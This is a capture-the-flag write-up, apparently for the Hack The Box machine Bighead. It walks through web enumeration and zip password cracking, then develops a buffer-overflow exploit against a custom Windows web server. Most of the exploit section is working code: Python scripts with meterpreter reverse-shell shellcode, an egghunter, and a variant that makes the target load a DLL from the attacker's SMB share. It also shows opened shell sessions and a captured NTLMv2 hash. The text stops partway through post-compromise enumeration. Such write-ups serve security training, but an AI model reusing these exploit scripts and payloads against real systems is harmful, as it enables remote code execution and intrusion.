(Status: 200)A couple interesting directories like phpmyadmin, dashboard and xampp but the apps are broken by design and I can‚Äôt do anything with them. I got some info about the server architecture from http://code.bighead.htb/server-info?config but that‚Äôs about it:Server Version: Apache/2.4.33 (Win32) OpenSSL/1.0.2o PHP/5.6.36Server Architecture: 32-bitIt‚Äôs interesting to note that the initial nmap scan found Nginx running on port 80 but here I have Apache running. That means Nginx is probably acting as a reverse proxy or load-balancer in front of Apache.Next, I enumerated the /testlink directory I found earlier and got the following:# gobuster -q -w /usr/share/wordlists/dirb/big.txt -t 50 -u http://code.bighead.htb/testlink -s 200/LICENSE (Status: 200)/ChangeLog (Status: 200)/Index (Status: 200)/changelog (Status: 200)/error (Status: 200)/index (Status: 200)/license (Status: 200)/linkto (Status: 200)/note (Status: 200)/plugin (Status: 200)[...]The note file is very interesting as it contains a hint:BIGHEAD! You F%*#ing R*#@*d!STAY IN YOUR OWN DEV SUB!!!...You have literally broken the code testing app and tools I spent all night building for Richard!I don't want to see you in my code again!Dinesh.So Bighead broke the app and Dinesh is telling him to get his own DEV sub-domain, maybe I should check if dev.bighead.htb exists‚Ä¶So after adding this sub-domain to the local hostfile, I can access a new page:Website enumeration: dev.bighead.htbAnything that has the word blog and wp-content in it hits an nginx rule and returns a false positive for anything that contains that. I didn‚Äôt find anything when I ran gobuster but dirb found the /coffee directory because it looks for more status codes by default.# dirb http://dev.bighead.htbGENERATED WORDS: 4612---- Scanning URL: http://dev.bighead.htb/ ----+ http://dev.bighead.htb/blog (CODE:302|SIZE:161)+ http://dev.bighead.htb/blog_ajax (CODE:302|SIZE:161)+ http://dev.bighead.htb/blog_inlinemod (CODE:302|SIZE:161)+ http://dev.bighead.htb/blog_report (CODE:302|SIZE:161)+ http://dev.bighead.htb/blog_search (CODE:302|SIZE:161)+ http://dev.bighead.htb/blog_usercp (CODE:302|SIZE:161)+ http://dev.bighead.htb/blogger (CODE:302|SIZE:161)+ http://dev.bighead.htb/bloggers (CODE:302|SIZE:161)+ http://dev.bighead.htb/blogindex (CODE:302|SIZE:161)+ http://dev.bighead.htb/blogs (CODE:302|SIZE:161)+ http://dev.bighead.htb/blogspot (CODE:302|SIZE:161)+ http://dev.bighead.htb/coffee (CODE:418|SIZE:46)+ http://dev.bighead.htb/wp-content (CODE:302|SIZE:161)The /coffee directory contains a funny teapot 418 error message.I also see it‚Äôs running a different webserver: BigheadWebSvr 1.0# curl --head dev.bighead.htb/coffeeHTTP/1.1 200 OKDate: Tue, 27 Nov 2018 02:20:48 GMTContent-Type: text/htmlContent-Length: 13456Connection: keep-aliveServer: BigheadWebSvr 1.0Google shows a github repository for that software: https://github.com/3mrgnc3/BigheadWebSvrI download BHWS_Backup.zip and saw that the zip file was encrypted. I can extract the hash and crack it with John:# zip2john BHWS_Backup.zip &gt; hash.txtBHWS_Backup.zip-&gt;BHWS_Backup/ is not encrypted!BHWS_Backup.zip-&gt;BHWS_Backup/conf/ is not encrypted!# cat hash.txtBHWS_Backup.zip:$zip2$*0*3*0*231ffea3729caa2f37a865b0dca373d7*d63f*49*61c6e7d2949fb22573c57dec460346954bba23dffb11f1204d4a6bc10e91b4559a6b984884fcb376ea1e2925b127b5f6721c4ef486c481738b94f08ac09df30c30d2ae3eb8032c586f*28c1b9eb8b0e1769b4d3*$/zip2$:::::BHWS_Backup.zip# john -w=/usr/share/wordlists/rockyou.txt --fork=4 hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])Node numbers 1-4 of 4 (fork)Press 'q' or Ctrl-C to abort, almost any other key for status2 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/s3 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/s4 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/sthepiedpiper89   (BHWS_Backup.zip)1 1g 0:00:00:00 DONE (2018-11-26 21:41) 100.0g/s 100.0p/s 100.0c/s 100.0C/s thepiedpiper89Waiting for 3 children to terminateUse the \"--show\" option to display all of the cracked passwords reliablySession completedPassword is : thepiedpiper89The archive contains the following files:-rw-r--r-- 1 root root   75 Jul 14  2018 BigheadWebSvr_exe_NOTICE.txtdrwx------ 2 root root 4096 Jul  2  2018 conf-rw-r--r-- 1 root root 1103 Jun 23  2018 fastcgi.conf-rw-r--r-- 1 root root 1032 Jun 23  2018 fastcgi_params-rw-r--r-- 1 root root 2946 Jun 23  2018 koi-utf-rw-r--r-- 1 root root 2326 Jun 23  2018 koi-win-rw-r--r-- 1 root root 5265 Jun 23  2018 mime.types-rw-r--r-- 1 root root 4523 Jul  2  2018 nginx.conf-rw-r--r-- 1 root root  653 Jun 23  2018 scgi_params-rw-r--r-- 1 root root  681 Jun 23  2018 uwsgi_params-rw-r--r-- 1 root root 3736 Jun 23  2018 win-utfThe .exe in the archive was replaced with a note instead:# cat BigheadWebSvr_exe_NOTICE.txtI removed this vulnerable crapware from the archiveloveGilfoyle... :DThe file history on Github shows an older copy of the zip file:I downloaded the file then tried to extract it but the password is not thepiedpiper89. I cracked the password again and found the older commit uses bighead as the archive password. After extracting the file I can see there is a BigheadWebSvr.exe binary in there instead of the note.# ls -ltotal 132-rw-r--r-- 1 root root 28540 Jul  2 16:33 bHeadSvr.dlldrwx------ 2 root root  4096 Jul  2 19:56 BHWS_Backup-rw-r--r-- 1 root root 51431 Jul  2 16:33 BigheadWebSvr.exedrwx------ 2 root root  4096 Jul  2 19:57 conf-rw-r--r-- 1 root root  1103 Jun 23 11:50 fastcgi.conf-rw-r--r-- 1 root root  1032 Jun 23 11:50 fastcgi_params-rw-r--r-- 1 root root  2946 Jun 23 11:50 koi-utf-rw-r--r-- 1 root root  2326 Jun 23 11:50 koi-win-rw-r--r-- 1 root root  5265 Jun 23 11:50 mime.types-rw-r--r-- 1 root root  4523 Jul  2 15:34 nginx.conf-rw-r--r-- 1 root root   653 Jun 23 11:50 scgi_params-rw-r--r-- 1 root root   681 Jun 23 11:50 uwsgi_params-rw-r--r-- 1 root root  3736 Jun 23 11:50 win-utf# file BigheadWebSvr.exe BigheadWebSvr.exe: PE32 executable (console) Intel 80386, for MS WindowsThere is also an nginx config file which shows the following interesting stuff:location / {\t\t\t# Backend server to forward requests to/from\t\t\tproxy_pass          http://127.0.0.1:8008;\t\t\tproxy_cache_convert_head off;\t\t\tproxy_cache_key $scheme$proxy_host$request_uri$request_method;\t\t\tproxy_http_version  1.1;\t\t\t\t\t\t# adds gzip\t\t\tgzip_static on;\t\t\t\t}location /coffee {\t\t\t# Backend server to forward requests to/from\t\t\t#rewrite /coffee /teapot/ redirect;\t\t\t#return 418;\t\t\tproxy_pass          http://127.0.0.1:8008;\t\t\tproxy_cache_convert_head off;\t\t\tproxy_intercept_errors off;\t\t\tproxy_cache_key $scheme$proxy_host$request_uri$request_method;\t\t\tproxy_http_version  1.1;\t\t\tproxy_pass_header Server;\t\t\t# adds gzip\t\t\tgzip_static on;\t\t\t\t}So, both requests to / and /coffee on dev.bighead.htb are served by that crap custom webserver but only /coffee reveals the server header because of the proxy_pass_header Server config file.Exploit development (Method #1 using egghunter)After opening the .exe file in IDA Free, I saw that the binary was compiled with Mingw. From what I googled, none of the protections like DEP/NX are enabled by default when compiling with mingw so that should make exploitation easier.The main function sets up up the socket listener and creates a ConnectionHandler thread when it receives a connection:The ConnectionHandler has multiple branches for the different HTTP methods. The HEAD request calls the Function4 function.The function uses an insecure strcpy to move data around so it‚Äôs possible there is a buffer overflow.I used the open-source x32/64dbg debugger to debug the software.I setup a breakpoint at the end of Function4 just before it returns.First, I test with a small payload that should not crash the server just to see if it catches the breakpoint and what the memory layout looks like.curl --head http://172.23.10.186:8008/AAAAAAAAAAAAAAThe program stops at the breakpoint and EAX contains the memory address where the HEAD request is located.The memory at 0x175FB28 contains part of the HEAD request.Next, I try sending 100 bytes and see if I can crash the program.curl --head http://172.23.10.186:8008/$(python -c 'print \"A\"*100')The program crashes, and I can see that the EIP register was overwritten by AAAAAAAA which is not a valid address here.Next I have to find the exact amount of data to push to overwrite EIP. After I few minutes I was able to find the exact offset:curl --head http://172.23.10.186:8008/$(python -c 'print((\"A\"*72)+(\"B\"*8))')I used mona in Immunity Debugger to confirm that no protection are enabled on BigheadWebSvr.exeNow I need to redirect the execution of the program to the EAX register value since this is where my payload will be located. I will use mona to look for gadgets in the program that I can use to jump to. Specifically, I‚Äôm looking for the memory address of a JMP EAX instruction.I found a gadget at address 0x625012f2 in the bHeadSvr.dll. No protection is enabled on this DLL.To test, I‚Äôll replace BBBBBBBB from my payload with the memory address of the JMP EAX. Notice the address is in the reverse order to respect the endianess.curl --head http://172.23.10.186:8008/$(python -c 'print((\"A\"*72)+(\"f2125062\"))')After the function returns, the EIP points to the JMP EAX instruction.Then it jumps to the memory address of EAX. We see here we only have 36 bytes of buffer space to work with.I‚Äôll align the stack first by pushing and popping the EAX value into ESP. To find the opcode for this I used nasm_shell.rb from Metasploit:# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb nasm &gt; push eax00000000  50                push eaxnasm &gt; pop esp00000000  5C                pop espEdit: In retrospect I don‚Äôt this part was required for this exploit, the exploit should have worked anyways because it doesn‚Äôt push/pop stuff off the stack.Since I don‚Äôt have much buffer space to work with I‚Äôll use a 32 bytes egghunter. Basically the egghunter is a small shellcode that looks for a marker (the egg) in memory and jumps to it when it finds it. This is the first stage of the exploit, the 2nd stage will be the rest of the shellcode we want to execute and we‚Äôll need to place it in memory with another HTTP request. Mona can generate the code for the egghunter. By default it uses the string w00t for the egg.The first stage payload is:  Align stack  Egghunter shellcode  JMP EAXThe second stage payload is:  w00tw00t (egg)  meterpreter payloadThe exploit tested locally on my Win7 VM is shown here:#!/usr/bin/pythonfrom pwn import *'''# msfvenom -p windows/meterpreter/reverse_tcp -b \\x00\\x0a\\x0d -f python LHOST=172.23.10.39 LPORT=80[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 11 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 368 (iteration=0)x86/shikata_ga_nai chosen with final size 368Payload size: 368 bytesFinal size of python file: 1772 bytes'''egg = \"\\x77\\x30\\x30\\x74\" # w00tpayload = egg + eggpayload += \"\\xbf\\x33\\x30\\xf9\\x54\\xdd\\xc2\\xd9\\x74\\x24\\xf4\\x5a\\x29\"payload += \"\\xc9\\xb1\\x56\\x31\\x7a\\x13\\x83\\xea\\xfc\\x03\\x7a\\x3c\\xd2\"payload += \"\\x0c\\xa8\\xaa\\x90\\xef\\x51\\x2a\\xf5\\x66\\xb4\\x1b\\x35\\x1c\"payload += \"\\xbc\\x0b\\x85\\x56\\x90\\xa7\\x6e\\x3a\\x01\\x3c\\x02\\x93\\x26\"payload += \"\\xf5\\xa9\\xc5\\x09\\x06\\x81\\x36\\x0b\\x84\\xd8\\x6a\\xeb\\xb5\"payload += \"\\x12\\x7f\\xea\\xf2\\x4f\\x72\\xbe\\xab\\x04\\x21\\x2f\\xd8\\x51\"payload += \"\\xfa\\xc4\\x92\\x74\\x7a\\x38\\x62\\x76\\xab\\xef\\xf9\\x21\\x6b\"payload += \"\\x11\\x2e\\x5a\\x22\\x09\\x33\\x67\\xfc\\xa2\\x87\\x13\\xff\\x62\"payload += \"\\xd6\\xdc\\xac\\x4a\\xd7\\x2e\\xac\\x8b\\xdf\\xd0\\xdb\\xe5\\x1c\"payload += \"\\x6c\\xdc\\x31\\x5f\\xaa\\x69\\xa2\\xc7\\x39\\xc9\\x0e\\xf6\\xee\"payload += \"\\x8c\\xc5\\xf4\\x5b\\xda\\x82\\x18\\x5d\\x0f\\xb9\\x24\\xd6\\xae\"payload += \"\\x6e\\xad\\xac\\x94\\xaa\\xf6\\x77\\xb4\\xeb\\x52\\xd9\\xc9\\xec\"payload += \"\\x3d\\x86\\x6f\\x66\\xd3\\xd3\\x1d\\x25\\xbb\\x10\\x2c\\xd6\\x3b\"payload += \"\\x3f\\x27\\xa5\\x09\\xe0\\x93\\x21\\x21\\x69\\x3a\\xb5\\x30\\x7d\"payload += \"\\xbd\\x69\\xfa\\xee\\x43\\x8a\\xfa\\x27\\x80\\xde\\xaa\\x5f\\x21\"payload += \"\\x5f\\x21\\xa0\\xce\\x8a\\xdf\\xaa\\x58\\x99\\x08\\xa1\\xbf\\x89\"payload += \"\\x34\\xb5\\xbf\\x19\\xb1\\x53\\xef\\xc9\\x91\\xcb\\x50\\xba\\x51\"payload += \"\\xbc\\x38\\xd0\\x5e\\xe3\\x59\\xdb\\xb5\\x8c\\xf0\\x34\\x63\\xe4\"payload += \"\\x6c\\xac\\x2e\\x7e\\x0c\\x31\\xe5\\xfa\\x0e\\xb9\\x0f\\xfa\\xc1\"payload += \"\\x4a\\x7a\\xe8\\x36\\x2d\\x84\\xf0\\xc6\\xd8\\x84\\x9a\\xc2\\x4a\"payload += \"\\xd3\\x32\\xc9\\xab\\x13\\x9d\\x32\\x9e\\x20\\xda\\xcd\\x5f\\x10\"payload += \"\\x90\\xf8\\xf5\\x1c\\xce\\x04\\x1a\\x9c\\x0e\\x53\\x70\\x9c\\x66\"payload += \"\\x03\\x20\\xcf\\x93\\x4c\\xfd\\x7c\\x08\\xd9\\xfe\\xd4\\xfc\\x4a\"payload += \"\\x97\\xda\\xdb\\xbd\\x38\\x25\\x0e\\xbe\\x3f\\xd9\\xcc\\xe9\\xe7\"payload += \"\\xb1\\x2e\\xaa\\x17\\x41\\x45\\x2a\\x48\\x29\\x92\\x05\\x67\\x99\"payload += \"\\x5b\\x8c\\x20\\xb1\\xd6\\x41\\x82\\x20\\xe6\\x4b\\x42\\xfc\\xe7\"payload += \"\\x78\\x5f\\x0f\\x9d\\xf1\\x60\\xf0\\x62\\x18\\x05\\xf1\\x62\\x24\"payload += \"\\x3b\\xce\\xb4\\x1d\\x49\\x11\\x05\\x1a\\x42\\x24\\x28\\x0b\\xc9\"payload += \"\\x46\\x7e\\x4b\\xd8\"stage1 = \"POST /coffee HTTP/1.1\\r\\n\"stage1 += \"Host: dev.bighead.htb\\r\\n\"stage1 += \"Content-Length: {}\\r\\n\\r\\n\".format(len(payload))stage1 += payload + \"\\r\\n\"stage1 += \"\\r\\n\"r = remote('172.23.10.186', 8008)r.send(stage1)r.recv()r = remote('172.23.10.186', 8008)jmp_eax = \"f2125062\"align_esp = \"505C\" # push eax, pop espegghunter = \"6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7\"stage2 = align_esp + egghunter + \"9090\" + jmp_eaxr.send(\"HEAD /\" + stage2 + \" HTTP/1.1\\r\\nHost: dev.bighead.htb\\r\\n\\r\\n\")When the egghunter is scanning memory, CPU usage goes to 100% for a few seconds.When it hits the egg, it executes the meterpreter stager and we get a connection:msf5 exploit(multi/handler) &gt; [*] Encoded stage with x86/shikata_ga_nai[*] Sending encoded stage (179808 bytes) to 172.23.10.186[*] Meterpreter session 1 opened (172.23.10.39:80 -&gt; 172.23.10.186:49804) at 2019-05-03 19:37:47 -0400msf5 exploit(multi/handler) &gt; sessions 1[*] Starting interaction with 1...Nice, the exploit works locally.But when I tried running it against Bighead it didn‚Äôt work so I replicated the nginx setup locally in Win7 and found that the second stage shellcode was being URL encoded by nginx. To work around this I had to fix the POST request and remove the Content-Type header so it would not URL encode the payload then switch the content body to the raw shellcode (non URL-encoded).The final exploit looks like this:#!/usr/bin/pythonfrom pwn import *import requests'''# msfvenom -p windows/meterpreter/reverse_tcp -b \\x00\\x0a\\x0d -f python LHOST=10.10.14.23 LPORT=80[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 11 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 368 (iteration=0)x86/shikata_ga_nai chosen with final size 368Payload size: 368 bytesFinal size of python file: 1772 bytes'''egg = \"\\x77\\x30\\x30\\x74\" # w00tpayload = egg + eggpayload += \"\\xb8\\xc3\\x06\\x6e\\xa1\\xd9\\xcd\\xd9\\x74\\x24\\xf4\\x5f\\x2b\"payload += \"\\xc9\\xb1\\x56\\x83\\xef\\xfc\\x31\\x47\\x0f\\x03\\x47\\xcc\\xe4\"payload += \"\\x9b\\x5d\\x3a\\x6a\\x63\\x9e\\xba\\x0b\\xed\\x7b\\x8b\\x0b\\x89\"payload += \"\\x08\\xbb\\xbb\\xd9\\x5d\\x37\\x37\\x8f\\x75\\xcc\\x35\\x18\\x79\"payload += \"\\x65\\xf3\\x7e\\xb4\\x76\\xa8\\x43\\xd7\\xf4\\xb3\\x97\\x37\\xc5\"payload += \"\\x7b\\xea\\x36\\x02\\x61\\x07\\x6a\\xdb\\xed\\xba\\x9b\\x68\\xbb\"payload += \"\\x06\\x17\\x22\\x2d\\x0f\\xc4\\xf2\\x4c\\x3e\\x5b\\x89\\x16\\xe0\"payload += \"\\x5d\\x5e\\x23\\xa9\\x45\\x83\\x0e\\x63\\xfd\\x77\\xe4\\x72\\xd7\"payload += \"\\x46\\x05\\xd8\\x16\\x67\\xf4\\x20\\x5e\\x4f\\xe7\\x56\\x96\\xac\"payload += \"\\x9a\\x60\\x6d\\xcf\\x40\\xe4\\x76\\x77\\x02\\x5e\\x53\\x86\\xc7\"payload += \"\\x39\\x10\\x84\\xac\\x4e\\x7e\\x88\\x33\\x82\\xf4\\xb4\\xb8\\x25\"payload += \"\\xdb\\x3d\\xfa\\x01\\xff\\x66\\x58\\x2b\\xa6\\xc2\\x0f\\x54\\xb8\"payload += \"\\xad\\xf0\\xf0\\xb2\\x43\\xe4\\x88\\x98\\x0b\\xc9\\xa0\\x22\\xcb\"payload += \"\\x45\\xb2\\x51\\xf9\\xca\\x68\\xfe\\xb1\\x83\\xb6\\xf9\\xc0\\x84\"payload += \"\\x48\\xd5\\x6a\\xc4\\xb6\\xd6\\x8a\\xcc\\x7c\\x82\\xda\\x66\\x54\"payload += \"\\xab\\xb1\\x76\\x59\\x7e\\x2f\\x7d\\xcd\\x8b\\xa5\\x8f\\x1a\\xe4\"payload += \"\\xbb\\x8f\\x24\\xa4\\x32\\x69\\x74\\x14\\x14\\x26\\x35\\xc4\\xd4\"payload += \"\\x96\\xdd\\x0e\\xdb\\xc9\\xfe\\x30\\x36\\x62\\x94\\xde\\xee\\xda\"payload += \"\\x01\\x46\\xab\\x91\\xb0\\x87\\x66\\xdc\\xf3\\x0c\\x82\\x20\\xbd\"payload += \"\\xe4\\xe7\\x32\\xaa\\x92\\x07\\xcb\\x2b\\x37\\x07\\xa1\\x2f\\x91\"payload += \"\\x50\\x5d\\x32\\xc4\\x96\\xc2\\xcd\\x23\\xa5\\x05\\x31\\xb2\\x9f\"payload += \"\\x7e\\x04\\x20\\x9f\\xe8\\x69\\xa4\\x1f\\xe9\\x3f\\xae\\x1f\\x81\"payload += \"\\xe7\\x8a\\x4c\\xb4\\xe7\\x06\\xe1\\x65\\x72\\xa9\\x53\\xd9\\xd5\"payload += \"\\xc1\\x59\\x04\\x11\\x4e\\xa2\\x63\\x21\\x89\\x5c\\xf1\\x0e\\x32\"payload += \"\\x34\\x09\\x0f\\xc2\\xc4\\x63\\x8f\\x92\\xac\\x78\\xa0\\x1d\\x1c\"payload += \"\\x80\\x6b\\x76\\x34\\x0b\\xfa\\x34\\xa5\\x0c\\xd7\\x99\\x7b\\x0c\"payload += \"\\xd4\\x01\\x8c\\x77\\x95\\xb6\\x6d\\x88\\xbf\\xd2\\x6e\\x88\\xbf\"payload += \"\\xe4\\x53\\x5e\\x86\\x92\\x92\\x62\\xbd\\xad\\xa1\\xc7\\x94\\x27\"payload += \"\\xc9\\x54\\xe6\\x6d\"data = {\"payload\": payload}proxies = {\"http\": \"http://127.0.0.1:8080\"}s = requests.Session()r = requests.Request(\"POST\", \"http://dev.bighead.htb/coffee/\", data=data)p = r.prepare()p.body = payloaddel p.headers[\"Content-Type\"]try:    s.send(p, proxies=proxies, timeout=0.2)except requests.exceptions.ReadTimeout:    passr = remote(\"10.10.10.112\", 80)jmp_eax = \"f2125062\"align_esp = \"505C\" # push eax, pop espegghunter = \"6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7\"stage2 = align_esp + egghunter + \"9090\" + jmp_eaxr.send(\"HEAD /\" + stage2 + \" HTTP/1.1\\r\\nHost: dev.bighead.htb\\r\\n\\r\\n\")Launching exploit‚Ä¶# python exploit.py [+] Opening connection to 10.10.10.112 on port 80: Done[*] Closed connection to 10.10.10.112 port 80msf5 exploit(multi/handler) &gt; [*] Encoded stage with x86/shikata_ga_nai[*] Sending encoded stage (179808 bytes) to 10.10.10.112[*] Meterpreter session 4 opened (10.10.14.23:80 -&gt; 10.10.10.112:49306) at 2019-05-03 20:47:52 -0400msf5 exploit(multi/handler) &gt; msf5 exploit(multi/handler) &gt; sessions 4[*] Starting interaction with 4...meterpreter &gt; getuidServer username: PIEDPIPER\\NelsonExploit development (Method #2 using LoadLibrary over SMB)Instead of using an egghunter, we can also use the LoadLibrary function to load a remote DLL hosted on our machine through the Impacket SMB server. Using the debugger, I can see that the LoadLibrary is exported from bheadsrv.dll at address 0x625070C8.The function is simple and only expects a single parameter: the filename of the DLL file:HMODULE LoadLibraryA(  LPCSTR lpLibFileName);The exploit uses the same JMP EAX gadget to jump to the beginning of the buffer. Then we align the stack, and set EAX past the buffer and we push it to the stack: this will contain the address of the string of our SMB server. Finally we move the address of LoadLibrary into EBX then CALL EBX to call the function. The filename argument for LoadLibrary is popped from the stack and the DLL is then loaded.nasm &gt; add al, 0x2800000000  0428              add al,0x28nasm &gt; push eax00000000  50                push eaxnasm &gt; mov ebx, 0x62501B5800000000  BB581B5062        mov ebx,0x62501b58nasm &gt; call ebx00000000  FFD3              call ebxThe final exploit looks like this:#!/usr/bin/pythonfrom pwn import *import binasciir = remote(\"10.10.10.112\", 80)load_lib = \"\"load_lib += \"\\x80\\x04\\x28\"         # add ah, 28hload_lib += \"\\x50\"                 # push eaxload_lib += \"\\xBB\\x58\\x1B\\x50\\x62\" # 62501B58 ebx -&gt; LoadLibraryload_lib += \"\\xFF\\xD3\"             # call ebxsmb =  \"\\\\\\\\10.10.14.23\\\\share\\\\x.dll\"load_lib = binascii.hexlify(load_lib)smb = binascii.hexlify(smb)jmp_eax = \"f2125062\"align_esp = \"505C\" # push eax, pop espbuf =  align_esp + load_lib + \"90\" * 24 + jmp_eax + smbhead = \"HEAD /\" + buf + \" HTTP/1.1\\r\\n\"head += \"Host: dev.bighead.htb\\r\\n\"head += \"Connection: close\\r\\n\"head += \"\\r\\n\"r.send(head)r.close()This makes the server download a .dll from my box and execute it. So I can generate a malicious DLL with msfvenom and have the server fetch it to give me a reverse shell:# msfvenom -p windows/meterpreter/reverse_tcp -o x.dll -f dll LHOST=10.10.14.23 LPORT=4444[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 341 bytesFinal size of dll file: 5120 bytesSaved as: x.dllBecause the server uses SMB to talk back to us, we‚Äôll start an SMB share with Impacket:# /usr/share/doc/python-impacket/examples/smbserver.py share .Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsedFiring up the exploit‚Ä¶# python smbexploit.py 191HEAD /505C042850bb581b5062ffd3909090909090909090909090909090909090909090909090f21250625c5c31302e31302e31342e32335c73686172655c782e646c6c HTTP/1.1Host: dev.bighead.htbConnection: close...[*] Incoming connection (10.10.10.112,60888)[*] AUTHENTICATE_MESSAGE (PIEDPIPER\\Nelson,PIEDPIPER)[*] User Nelson\\PIEDPIPER authenticated successfully[*] Nelson::PIEDPIPER:4141414141414141:e8e4ea60eb43ad439299c50c245654ca:010100000000000000f1a060fc85d4017e4c61f17754814500000000010010004f00650051004a00490073005600450002001000730047006b007400540068006f005600030010004f00650051004a00490073005600450004001000730047006b007400540068006f0056000700080000f1a060fc85d40106000400020000000800300030000000000000000000000000200000282e2960465001d017bb89eae52e3c9002f1edefda8c004fd0186e57fb9bd3eb000000000000000000000000[*] Disconnecting Share(1:IPC$)...msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 10.10.10.112[*] Meterpreter session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.112:60889) at 2018-11-26 21:53:32 -0500msf exploit(multi/handler) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; getuidServer username: PIEDPIPER\\NelsonWindows enumerationNow that I finally have a shell, I tried to get user.txt but this version is just a troll:meterpreter &gt; cat /users/nelson/desktop/user.txt    .-''-.  .-------.      .---.    .-./`)     _______   .---.  .---.           .'_ _   \\ |  _ _   \\     | ,_|    \\ .-.')   /   __  \\  |   |  |_ _|          / ( ` )   '| ( ' )  |   ,-./  )    / `-' \\  | ,_/  \\__) |   |  ( ' )         . (_ o _)  ||(_ o _) /   \\  '_ '`)   `-'`\"`,-./  )       |   '-(_{;}_)        |  (_,_)___|| (_,_).' __  &gt; (_)  )   .---. \\  '_ '`)     |      (_,_)         '  \\   .---.|  |\\ \\  |  |(  .  .-'   |   |  &gt; (_)  )  __ | _ _--.   |          \\  `-'    /|  | \\ `'   / `-'`-'|___ |   | (  .  .-'_/  )|( ' ) |   |           \\       / |  |  \\    /   |        \\|   |  `-'`-'     / (_{;}_)|   |            `'-..-'  ''-'   `'-'    `--------`'---'    `._____.'  '(_,_) '---'                   .---.       ,-----.    ,---.  ,---.   .-''-.     .-'''-.                      | ,_|     .'  .-,  '.  |   /  |   | .'_ _   \\   / _     \\                   ,-./  )    / ,-.|  \\ _ \\ |  |   |  .'/ ( ` )   ' (`' )/`--'                   \\  '_ '`) ;  \\  '_ /  | :|  | _ |  |. (_ o _)  |(_ o _).                       &gt; (_)  ) |  _`,/ \\ _/  ||  _( )_  ||  (_,_)___| (_,_). '.                    (  .  .-' : (  '\\_/ \\   ;\\ (_ o._) /'  \\   .---..---.  \\  :                    `-'`-'|___\\ `\"/  \\  ) /  \\ (_,_) /  \\  `-'    /\\    `-'  |                     |        \\'. \\_/``\".'    \\     /    \\       /  \\       /                      `--------`  '-----'       `---`      `'-..-'    `-...-'                             ,---------. .---.  .---.     .-''-.                                           \\          \\|   |  |_ _|   .'_ _   \\                                           `--.  ,---'|   |  ( ' )  / ( ` )   '                                             |   \\   |   '-(_{;}_). (_ o _)  |                                             :_ _:   |      (_,_) |  (_,_)___|                                             (_I_)   | _ _--.   | '  \\   .---.                                            (_(=)_)  |( ' ) |   |  \\  `-'    /                                             (_I_)   (_{;}_)|   |   \\       /                                              '---'   '(_,_) '---'    `'-..-'                                                        .---.  .---.    ____       .-'''-. .---.  .---.        .-,                    |   |  |_ _|  .'  __ `.   / _     \\|   |  |_ _|     ,-.|  \\ _                 |   |  ( ' ) /   '  \\  \\ (`' )/`--'|   |  ( ' )     \\  '_ /  |                |   '-(_{;}_)|___|  /  |(_ o _).   |   '-(_{;}_)    _`,/ \\ _/                 |      (_,_)    _.-`   | (_,_). '. |      (_,_)    (  '\\_/ \\                  | _ _--.   | .'   _    |.---.  \\  :| _ _--.   |     `\"/  \\  )                 |( ' ) |   | |  _( )_  |\\    `-'  ||( ' ) |   |       \\_/``\"                  (_{;}_)|   | \\ (_ o _) / \\       / (_{;}_)|   |                               '(_,_) '---'  '.(_,_).'   `-...-'  '(_,_) '---'  Doing some enumeration next‚Ä¶System info:meterpreter &gt; getuidServer username: PIEDPIPER\\Nelsonmeterpreter &gt; sysinfoComputer        : PIEDPIPEROS              : Windows 2008 (Build 6002, Service Pack 2).Architecture    : x86System Language : en_GBDomain          : DEVELOPMENTLogged On Users : 5Meterpreter     : x86/windowsInstalled programs:Notice SSH is installed, 7-Zip and Keepass.meterpreter &gt; run post/windows/gather/enum_applications [*] Enumerating applications installed on PIEDPIPERInstalled Applications====================== Name                                                              Version ----                                                              ------- 7-Zip 18.05                                                       18.05 Bitnami TestLink Module                                           1.9.17-0 Bitvise SSH Server 7.44 (remove only)                             7.44 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB953595)            1 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB958484)            1 KeePass Password Safe 2.40                                        2.40 Microsoft .NET Framework 3.5 SP1                                  3.5.30729 Microsoft .NET Framework 4.5.2                                    4.5.51209 Microsoft .NET Framework 4.5.2                                    4.5.51209 Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022         9.0.21022 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161    9.0.30729.6161 Mozilla Firefox 52.9.0 ESR (x86 en-GB)                            52.9.0 Notepad++ (32-bit x86)                                            7.5.9 Oracle VM VirtualBox Guest Additions 5.2.12                       5.2.12.0 Python 2.7.15                                                     2.7.15150 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2604111)  1 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2736416)  1 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2840629)  1 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2861697)  1 Update for Microsoft .NET Framework 3.5 SP1 (KB963707)            1 Update for Microsoft .NET Framework 4.5.2 (KB4040977)             1 Update for Microsoft .NET Framework 4.5.2 (KB4096495)             1 Update for Microsoft .NET Framework 4.5.2 (KB4098976)             1 Update for Microsoft .NET Framework 4.5.2 (KB4338417)             1 Update for Microsoft .NET Framework 4.5.2 (KB4344149)             1 Update for Microsoft 